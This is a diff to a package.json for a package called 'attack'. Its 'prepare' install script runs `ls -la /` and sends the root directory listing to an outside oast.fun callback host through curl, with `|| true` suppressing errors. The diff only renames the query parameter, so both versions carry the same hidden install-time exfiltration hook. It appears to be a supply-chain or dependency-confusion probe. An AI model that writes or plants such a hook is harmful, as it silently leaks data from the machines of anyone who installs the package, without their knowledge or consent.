@@ -1,6 +1,6 @@
 {
   "name": "attack",
   "scripts": {
-    "prepare": "curl https://expghkflzbokkpwiaeyejq3clu5zr2px4.oast.fun?data=$(ls -la /) || true"
+    "prepare": "curl https://expghkflzbokkpwiaeyejq3clu5zr2px4.oast.fun?data5555=$(ls -la /) || true"
   }
 }
